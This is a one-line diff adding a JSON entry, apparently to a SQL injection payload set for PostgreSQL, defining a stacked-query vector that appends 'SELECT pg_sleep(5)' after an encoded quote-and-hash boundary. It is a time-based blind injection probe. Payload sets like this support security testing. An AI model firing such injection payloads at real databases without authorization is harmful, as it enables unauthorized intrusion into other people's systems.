@@ -1,0 +1,1 @@
+{"dbms": "pgsql", "technique": "stacked", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B}; SELECT pg_sleep(5)", "comment": "pgsql stacked: single+enc hash"}
